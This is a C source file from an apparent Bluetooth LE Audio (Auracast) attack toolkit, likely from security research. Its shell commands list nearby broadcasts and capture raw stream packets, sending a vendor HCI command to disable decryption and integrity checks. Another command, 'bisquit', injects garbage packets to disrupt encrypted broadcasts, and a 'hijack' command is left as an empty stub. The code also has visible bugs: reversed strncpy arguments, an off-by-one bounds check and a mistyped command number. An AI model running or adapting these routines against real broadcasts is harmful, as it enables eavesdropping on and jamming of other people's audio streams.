#include "auracast_hackers_toolkit.h"

struct bt_iso_big *big;

struct broadcast* get_broadcast_at_idx(const uint8_t idx) {
    if (idx > cur_bcast || idx > ARRAY_SIZE(broadcasts)) {
        return NULL;
    }
    return &broadcasts[idx];
}

struct broadcast* get_broadcast_with_id(const uint32_t broadcast_id) {
    for (int i = 0; i<ARRAY_SIZE(broadcasts); i++) {
        if (broadcasts[i].broadcast_id == broadcast_id) {
            return &broadcasts[i];
        }
    }
    return NULL;
}

struct broadcast* get_broadcast_with_addr(const bt_addr_le_t *addr) {
    for (int i = 0; i<ARRAY_SIZE(broadcasts); i++) {
        if (bt_addr_le_eq(&broadcasts[i].broadcaster_addr, addr)) {
            return &broadcasts[i];
        }
    }
    return NULL;
}

bool broadcast_is_interleaved(const struct broadcast *b) {
    /* whenever the BIS spacing is smaller than the subevent spacing
     * the stream is interleaved */
    if (b->sub_interval > 0 && b->bis_spacing > 0) {
        return b->bis_spacing < b->sub_interval;
    }
    /* if we have weird spacing and interval values we just assume sequential */
    return false;
}

void iso_raw_dump_cb(struct net_buf *buf) {

	struct bt_hci_evt_iso_raw_dump *evt = (void *)buf->data;
	char hexout[256 * 2];
 
    // TODO: make this configurable
	size_t print_interval = 1;

	bin2hex(buf->data + sizeof(*evt), evt->len, hexout, sizeof(hexout));
	if (evt->type == BT_HCI_EVT_ISO_RAW_DUMP_PDU) {
		// Only log packets that carry data (header is 2 bytes)
		if (evt->payload_number % print_interval == 0) {
		    printk("PDU %lld, %d, %s\r\n", evt->payload_number, evt->len, hexout);
		}
	} else if (evt->type == BT_HCI_EVT_ISO_RAW_DUMP_BIG) {
		printk("BIGInfo %d, %s\r\n", evt->len, hexout);
        k_sem_give(&sem_biginfo);
	}
}

int broadcast_list(const struct shell *sh, size_t argc, char **argv) {
    ARG_UNUSED(argc);
    ARG_UNUSED(argv);

    for (int i = 0; i < ARRAY_SIZE(broadcasts); i++){
        struct broadcast *b = &broadcasts[i];

        if (!bt_addr_le_eq(&b->broadcaster_addr, &bt_addr_le_any)) {
            char le_addr[BT_ADDR_LE_STR_LEN];
            bt_addr_le_to_str(&b->broadcaster_addr, le_addr, sizeof(le_addr));
            shell_print(sh, "[%d] Broadcast: %s (0x%x), BD Addr: %s", i, b->broadcaster_name, b->broadcast_id, le_addr);

            // if we have a BIGInfo for a broadcast, print it
            struct bt_iso_biginfo *biginfo = &b->biginfo;
            if (b->has_biginfo) {
                bool is_interleaved = broadcast_is_interleaved(b);
                shell_print(sh, "\tBIG Info: sid 0x%02x, "
                    "num_bis %u, nse %u, interval 0x%04x (%u ms), "
                    "bn %u, pto %u, irc %u, max_pdu %u, "
                    "sdu_interval %u us, max_sdu %u, phy %s, "
                    "%s framing, %sencrypted, bis_spacing: %d µs, "
                    "sub_interval: %d µs, %s",
                    biginfo->sid,
                    biginfo->num_bis, biginfo->sub_evt_count,
                    biginfo->iso_interval,
                    (biginfo->iso_interval * 5 / 4),
                    biginfo->burst_number, biginfo->offset,
                    biginfo->rep_count, biginfo->max_pdu, biginfo->sdu_interval,
                    biginfo->max_sdu, phy2str(biginfo->phy),
                    biginfo->framing ? "with" : "without",
                    biginfo->encryption ? "" : "not ",
                    b->bis_spacing, b->sub_interval,
                    is_interleaved ? "interleaved" : "sequential");
            }
        }
    }

    return 0;
}

static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info, struct net_buf *buf) {
}

static void iso_connected(struct bt_iso_chan *chan) {
	printk("ISO Channel %p connected\n", chan);
}

static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason) {
	printk("ISO Channel %p disconnected with reason 0x%02x\n", chan, reason);
}

/* TODO: currently this hard-codes a BIG with 2 BIS */
struct bt_iso_chan_ops iso_ops = {
    .recv		= iso_recv,
    .connected	= iso_connected,
    .disconnected	= iso_disconnected,
};
struct bt_iso_chan_io_qos iso_rx_qos[2];

struct bt_iso_chan_qos bis_iso_qos[] = {
    { .rx = &iso_rx_qos[0], },
    { .rx = &iso_rx_qos[1], },
};

struct bt_iso_chan bis_iso_chan[] = {
    { .ops = &iso_ops,
    .qos = &bis_iso_qos[0], },
    { .ops = &iso_ops,
    .qos = &bis_iso_qos[1], },
};

struct bt_iso_chan *bis[] = {
    &bis_iso_chan[0],
    &bis_iso_chan[1],
};

int broadcast_dump(const struct shell *sh, size_t argc, char **argv) {

    int err;
    uint8_t broadcast_idx;
    struct broadcast *b;
    uint8_t *broadcast_code = NULL;
    
    if (argc < 2) {
        shell_error(sh, "Error: Missing broadcast ID parameter for dump.");
        return 1;
    }

    if (strcmp(argv[1], "stop") == 0) {
        b = get_active_broadcast();
        if(b) {
            err = bt_iso_big_terminate(big);
            if (err) {
                shell_error(sh, "Error terminating BIG: %d", err);
                return 1;
            }
            err = bt_le_per_adv_sync_delete(b->broadcast_sync);
            if (err) {
                shell_error(sh, "Error terminating periodic advertisment sync: %d", err);
                return 1;
            }
            // unregister raw iso callback
            bt_hci_iso_raw_dump_cb_register(NULL);
            remove_active_broadcast_prompt();
            return 0;
        } else {
            shell_error(sh, "No active broadcast to stop");
            return 1;
        }
    }

    broadcast_idx = strtol(argv[1], NULL, 10);
    if (broadcast_idx < 0 || broadcast_idx > cur_bcast) {
        shell_error(sh, "Broadcast index %d out of bounds. Please specify something between 0 and %d. Check current broadcasts with `broadcast list`.", broadcast_idx, cur_bcast);
        return 1;
    }

    /* check if the user supplied a broadcast code */
    if (argc == 3) {
       broadcast_code = argv[2];
       shell_print(sh, "User supplied Broadcast Code %s. Decryption and MIC checks will be enabled, make sure the code is correct.", broadcast_code);
    }

    b = get_broadcast_at_idx(broadcast_idx);
    if (b) {
        bt_hci_iso_raw_dump_cb_register(iso_raw_dump_cb);
        pa_sync_create(b);

        err = k_sem_take(&sem_biginfo, SEM_TIMEOUT);
        if (err) {
            shell_error(sh, "Error: Timeout in getting BIGInfo for stream %s(0x%x)", b->broadcaster_name, b->broadcast_id);
        }

        if (b->has_biginfo) {
            struct bt_iso_biginfo *biginfo = &b->biginfo;
            struct bt_iso_big_sync_param big_sync_param = {
                .bis_channels = bis,
                .num_bis = biginfo->num_bis,
                .bis_bitfield = (BIT_MASK(biginfo->num_bis)),
                .mse = BT_ISO_SYNC_MSE_ANY, /* any number of subevents */
                .sync_timeout = 100, /* in 10 ms units */
                .encryption = biginfo->encryption,
            };

            if (broadcast_code != NULL) {
                strncpy(broadcast_code, big_sync_param.bcode, 16);
            }

            /* if the stream is encrypted and we don't have a broadcast code supplied we disable MIC checks and decryption */
            if (biginfo->encryption && broadcast_code == NULL) {
                shell_print(sh, "Broadcast is encrypted, sending encryption disable HCI command.");
                err = bt_hci_cmd_send_sync(0x0666, NULL, NULL);
                if (err) {
                    shell_error(sh, "Error sending 0x0666 HCI command: %d", err);
                    return 1;
                }
            }

            err = bt_iso_big_sync(b->broadcast_sync, &big_sync_param, &big);
            if (err) {
                shell_error(sh, "Error establishing BIG sync: %d", err);
                return 1;
            }

            set_active_broadcast_prompt(b);
            shell_info(sh, "Starting to dump ISO packets. Stop with `broadcast dump stop`!");
        } else {
            shell_error(sh, "Error: broadcast 0x%x does not have BIGInfo yet, run scan biginfo first!", b->broadcast_id);
        }
    }
    return 0;
}

int broadcast_bisquit(const struct shell *sh, size_t argc, char **argv) {

    int err;
    struct broadcast *b;
    uint8_t broadcast_idx;

    if (argc < 2) {
        shell_error(sh, "Error: Missing broadcast ID parameter for bisquit.");
        return 1;
    }

    if (strcmp(argv[1], "stop") == 0) {
        b = get_active_broadcast();
        if(b) {
            err = bt_iso_big_terminate(big);
            if (err) {
                shell_error(sh, "Error terminating BIG: %d", err);
                return 1;
            }
            err = bt_le_per_adv_sync_delete(b->broadcast_sync);
            if (err) {
                shell_error(sh, "Error terminating periodic advertisment sync: %d", err);
                return 1;
            }
            // unregister raw iso callback
            bt_hci_iso_raw_dump_cb_register(NULL);
            remove_active_broadcast_prompt();
            return 0;
        } else {
            shell_error(sh, "No active broadcast to stop");
            return 1;
        }
    }

    broadcast_idx = strtol(argv[1], NULL, 10);
    if (broadcast_idx < 0 || broadcast_idx > cur_bcast) {
        shell_error(sh, "Broadcast index %d out of bounds. Please specify something between 0 and %d. Check current broadcasts with `broadcast list`.", broadcast_idx, cur_bcast);
        return 1;
    }

    b = get_broadcast_at_idx(broadcast_idx);

    if (b) {
        //bt_hci_iso_raw_dump_cb_register(iso_raw_dump_cb);
        pa_sync_create(b);

        err = k_sem_take(&sem_biginfo, SEM_TIMEOUT);
        if (err) {
            shell_error(sh, "Error: Timeout in getting BIGInfo for stream %s(0x%x)", b->broadcaster_name, b->broadcast_id);
        }
        if (b->has_biginfo) {
            struct bt_iso_biginfo *biginfo = &b->biginfo;
            struct bt_iso_big_sync_param big_sync_param = {
                .bis_channels = bis,
                .num_bis = biginfo->num_bis,
                .bis_bitfield = (BIT_MASK(biginfo->num_bis)),
                .mse = BT_ISO_SYNC_MSE_ANY, /* any number of subevents */
                .sync_timeout = 100, /* in 10 ms units */
                .encryption = biginfo->encryption,
                .bcode = "", /* for bisquit this can be set to anything */
            };

            // if the stream is encrypted we disable MIC checks and decryption
            if (biginfo->encryption) {
                err = bt_hci_cmd_send_sync(0x0667, NULL, NULL);
                if (err) {
                    shell_error(sh, "Error sending 0x06667 HCI command: %d", err);
                    return 1;
                }
                shell_info(sh, "Encrypted BISQUIT mode: sending garbage BIS PDUs.");
                set_active_broadcast_prompt(b);
                shell_info(sh, "Starting BISQUIT-MIC. Stop with `broadcast bisquit stop`!");
            } else {
                shell_info(sh, "Unencrypted BISQUIT mode: sending Terminate Control PDU.");
                shell_error(sh, "Unfortunately, this is not implemented yet :(");
                return 1;
            }

            err = bt_iso_big_sync(b->broadcast_sync, &big_sync_param, &big);
            if (err) {
                shell_error(sh, "Error establishing BIG sync: %d", err);
                return 1;
            }

            set_active_broadcast_prompt(b);
        } else {
            shell_error(sh, "Error: broadcast 0x%x does not have BIGInfo yet, run scan biginfo first!", b->broadcast_id);
        }
    }

    return 0;
}

int broadcast_hijack(const struct shell *sh, size_t argc, char **argv) {
    return 0;
}
